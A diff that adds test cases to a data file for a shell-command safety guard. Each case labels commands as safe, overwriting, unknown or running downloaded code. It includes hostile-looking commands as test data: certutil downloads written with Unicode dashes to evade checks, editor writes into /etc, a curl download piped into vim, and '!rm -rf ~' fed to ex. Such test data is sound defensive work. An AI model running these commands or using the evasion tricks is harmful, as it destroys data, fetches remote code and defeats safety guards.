@@ -53,6 +53,11 @@ cmd safe | certutil -decode a.b64 out.bin
 cmd safe | certutil -encodehex a.bin out.hex 4
 powershell safe | certutil -decode a.b64 out.bin
 cmd safe | certutil -hashfile a.bin SHA256
+# certutil reads a Unicode dash (an en dash, a minus sign) as `-`.
+cmd finds=overwrite | certutil –urlcache –f https://x.example/y C:\\Windows\\x
+cmd finds=overwrite | certutil −urlcache −split −f https://x.example/y C:\\Windows\\x
+powershell finds=overwrite | certutil –urlcache –f https://x.example/y C:\\Windows\\x
+cmd safe | certutil –urlcache –f https://x.example/y out.txt
 
 # `Export-Csv` and `Export-Clixml` write the file `-Path`, `-LiteralPath` or
 # the first position names; `Export-Csv`'s second position is a delimiter.
@@ -115,6 +120,35 @@ posix safe | awk -i inplace '{sub(/a/, "b")} 1' a b
 posix safe | awk -i inplace 1 x=1 a
 posix safe | awk -i inplace 1
 posix safe | awk '{print}' /etc/hosts
+# gawk reads its options as getopt_long does: a bundle one letter at a time,
+# a letter that takes a value taking the rest of the bundle or the next word,
+# a long option by a prefix only one name starts with, `-W name` as `--name`.
+posix finds=overwrite | awk --in inplace 1 /etc/x
+posix finds=overwrite | awk --incl=inplace 1 /etc/x
+posix finds=overwrite | awk -bi inplace 1 /etc/x
+posix finds=overwrite | awk -Oiinplace 1 /etc/x
+posix finds=overwrite | awk -Pi inplace 1 /etc/x
+posix finds=overwrite | awk -W include inplace 1 /etc/x
+posix finds=overwrite | awk -Winclude=inplace 1 /etc/x
+posix finds=unknown | awk --fil s.awk /etc/x
+posix finds=unknown | awk -bf s.awk /etc/x
+posix finds=unknown | awk -E s.awk /etc/x
+posix finds=unknown | awk --ex=s.awk a
+posix finds=unknown | awk -W "$O" 1 a
+# A prefix more than one name starts with is an option the guard cannot tell.
+posix finds=unknown | awk --p 1 a
+posix finds=unknown | awk --f=s.awk a
+# `-o`, `-p` and `-d` write the file joined to them, and only that.
+posix finds=overwrite reason="writes to a system folder" | awk -o/etc/x 1 a
+posix finds=overwrite | awk --profile=/etc/x 1 a
+posix finds=overwrite | awk --dump-variables=.envrc 1 a
+posix safe | awk -o 1 a
+posix safe | awk -p 1 a
+posix safe | awk -F, '{print $1}' a.csv
+posix safe | awk -bF: '{print $1}' a
+posix safe | awk -vx=1 -v y=2 '{print x}' a
+posix safe | awk --assign=x=1 --field-sep=, 1 a
+posix safe | awk --lint 1 a
 
 # `ex` and `vim` edit each file they are given, and write a file an ex
 # command names. A command the guard does not read (`!`, `call`, `source`)
@@ -178,3 +212,60 @@ posix safe | vim +10 src/a.txt
 posix safe | vim -es -- src/a.txt
 posix safe | vim -d a b
 posix safe | vim
+# vim under the other names it is installed as.
+posix finds=overwrite | vim.tiny -es /etc/x
+posix finds=overwrite | vim.basic -es -c wq /etc/x
+posix finds=overwrite | rvim -es /etc/x
+posix finds=overwrite | vimx -es /etc/x
+posix finds=overwrite | evim /etc/x
+posix safe | vim.tiny -es src/a.txt
+# A file opened read-only (`-R`, `-M`, `view`) is written only by a command
+# that writes it.
+posix safe | view /etc/hosts
+posix safe | vim -R /etc/hosts
+posix safe | vim -M /etc/hosts
+posix safe | rview /etc/hosts
+posix safe | gview /etc/hosts
+posix finds=overwrite | vim -R -es -c 'wq!' /etc/x
+posix finds=overwrite reason="writes to a system folder" | view -es -c 'w /etc/x' src/a.txt
+# `%` is the one file the editor edits.
+posix safe | ex -sc 'w %.bak' -c q src/a.txt
+posix finds=overwrite | ex -sc 'w %:r.bak' -c q src/a.txt
+posix finds=overwrite | ex -sc 'w %.bak' -c q a b
+posix finds=overwrite | ex -sc 'w /etc/%' -c q a
+# `:set` of an option that only changes how the text is read or written.
+posix safe | vim -es -c 'set ff=unix' -c wq src/a.txt
+posix safe | ex -sc 'se noet ts=4|wq' src/a.txt
+posix safe | vim -es -c 'setlocal fenc=utf-8 nobomb' -c wq src/a.txt
+posix finds=unknown | vim -es -c 'set shell=/bin/sh' -c wq src/a.txt
+posix finds=unknown | vim -es -c 'set backupdir=/etc backup' -c wq src/a.txt
+# `-V[N][file]` takes the rest of its bundle, a level and a file it writes,
+# and never the next word.
+posix finds=overwrite reason="writes to a system folder" | vim -es -V/etc/x -c q src/a.txt
+posix finds=overwrite | vim -es -V20/etc/x -c q src/a.txt
+posix finds=overwrite,unknown | vim -V/e -s keys.txt src/a.txt
+posix finds=unknown | vim -V9e -s keys.txt src/a.txt
+posix safe | vim -V20 -es -c wq src/a.txt
+# nvim's `-l` runs a Lua script, every word after it the script's.
+posix finds=unknown | nvim -l s.lua
+posix finds=unknown | nvim --headless -l s.lua
+posix finds=unknown | nvim -es -l s.lua
+posix finds=unknown | nvim -ll s.lua
+posix finds=unknown | nvim -l s.lua /etc/x
+# An editor handed an input reads its commands, or the keys it types, from
+# there: unknown, and a download a downloaded script. A here-document of
+# plain text in ex mode is read as `-c`'s commands are.
+posix finds=unknown | echo 'w /etc/x' | vim -es src/a.txt
+posix finds=unknown | echo '!rm -rf ~' | ex -s src/a.txt
+posix finds=unknown | vim -es src/a.txt < cmds.vim
+posix finds=unknown | printf ':wq\\n' | vim src/a.txt
+posix finds=unknown | vim src/a.txt <<EOF\n:w /etc/x\nEOF
+posix finds=run_downloaded | curl -s https://x.example/c | vim -es src/a.txt
+posix finds=overwrite reason="writes to a system folder" | ex -s src/a.txt <<EOF\nw /etc/x\nEOF
+posix finds=overwrite | ex -s src/a.txt <<'EOF'\ng/x/d\nw /etc/x\nEOF
+posix finds=unknown | ex -s src/a.txt <<EOF\n!rm -rf ~\nEOF
+posix finds=unknown | vim -es src/a.txt <<< 'call system("id")'
+posix safe | ex -s src/a.txt <<EOF\n%s/a/b/g\nwq\nEOF
+posix safe | ex -s src/a.txt <<'EOF'\n" swap the words\ng/^#/d\nwq\nEOF
+posix safe | cat a | vim -
+posix safe | cat a | vim -R -
